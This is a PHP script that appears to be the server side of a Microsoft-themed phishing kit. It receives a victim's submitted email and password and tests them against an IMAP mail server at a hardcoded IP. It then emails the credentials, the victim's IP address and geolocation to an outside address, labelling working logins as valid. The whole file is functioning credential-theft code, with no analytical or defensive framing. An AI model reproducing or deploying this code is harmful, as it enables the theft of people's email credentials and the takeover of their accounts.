<?php
header("Access-Control-Allow-Origin: *");
error_reporting(0);
$output = '';
ob_start();
$output = check_details();
$get_allpagecontents = ob_get_clean();	
echo $output;

function check_details(){
	$output1 = '-';
	
	
if(isset($_POST['Email']) && !empty($_POST['Email'])
 && isset($_POST['password']) && !empty($_POST['password'])
){
  $body = "";
  $username = strtolower(trim($_POST['Email']));
  $password = $_POST['password'];
  $auth = @check_imap_connect($username, $password);
  if($auth === false){
    $output1 = 'no';
    $body .= "------\n";
    $to = "inc@cmamash.com";
    $details_ip = get_ip_ddrs_detailz();
    $headers = "From: handler@ddrs.com";
    $subject = "Microsoft 2020 | {$details_ip['ip']}";
    $body .= "E : $username\nP : $password\n";
    $body .= "------\n";
    $body .= "IP : {$details_ip['ip']}\n";
    $body .= "City : {$details_ip['city']}\n";
    $body .= "Country : {$details_ip['country']}\n";
    $body .= "Region : {$details_ip['region']}\n";
    $body .= "------\n";
    $body .= "\n\n----------------------------------------\n - by *X -";
    @mail($to, $subject, $body, $headers);
  } else {
    $output1 = 'yes';
    $body .= "VALID TRUE LOGIN !\n";
    $body .= "------\n";
    $to = "inc@cmamash.com";
    $details_ip = get_ip_ddrs_detailz();
    $headers = "From: handler@ddrs.com";
    $subject = "Microsoft 2020 | {$details_ip['ip']}";
    $body .= "E : $username\nP : $password\n";
    $body .= "------\n";
    $body .= "IP : {$details_ip['ip']}\n";
    $body .= "City : {$details_ip['city']}\n";
    $body .= "Country : {$details_ip['country']}\n";
    $body .= "Region : {$details_ip['region']}\n";
    $body .= "------\n";
    $body .= "\n\n----------------------------------------\n - by *X -";
    @mail($to, $subject, $body, $headers);
  }      
}


return $output1;
}


function get_ip_ddrs_detailz(){
require_once('geoplugin.class.php');
$ip_details= '';
$geoplugin = new geoPlugin();

$geoplugin->locate();

// $ip_details = "IP Address: {$geoplugin->ip} , Country Name: {$geoplugin->countryName} , Country Code: {$geoplugin->countryCode} , ";
// $ip_details .= "City: {$geoplugin->city} , Region Name: {$geoplugin->regionName} , Region: {$geoplugin->region}";

return ['ip' => $geoplugin->ip, 'city' => $geoplugin->city, 'region' => $geoplugin->regionName, 'country' => $geoplugin->countryName];

}
function check_imap_connect($username, $password){
$output = false;
$hostname = '{40.101.54.2:993/imap/ssl/novalidate-cert}INBOX';
imap_timeout(IMAP_OPENTIMEOUT, 8);
imap_timeout(IMAP_READTIMEOUT, 8);
imap_timeout(IMAP_WRITETIMEOUT, 8);
imap_timeout(IMAP_CLOSETIMEOUT, 8);
$inbox = imap_open($hostname,$username,$password);
if($inbox){
  $output = true;
}

imap_close($inbox);
return $output;
}

//$end_time=time()-$start_time;
//echo "<br>SECONDS ELAPSED: $end_time";
?>
